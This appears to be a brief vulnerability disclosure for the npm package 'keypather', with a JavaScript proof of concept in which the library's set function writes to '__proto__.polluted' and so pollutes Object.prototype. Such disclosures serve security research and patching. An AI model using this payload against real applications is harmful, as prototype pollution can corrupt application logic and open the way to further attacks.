# keypather

- package name: `keypather`

- PoC exploit:

```javascript
var set = require('keypather/set')

set({}, '__proto__.polluted', 'yes')
// Object.prototype.polluted === 'yes'
```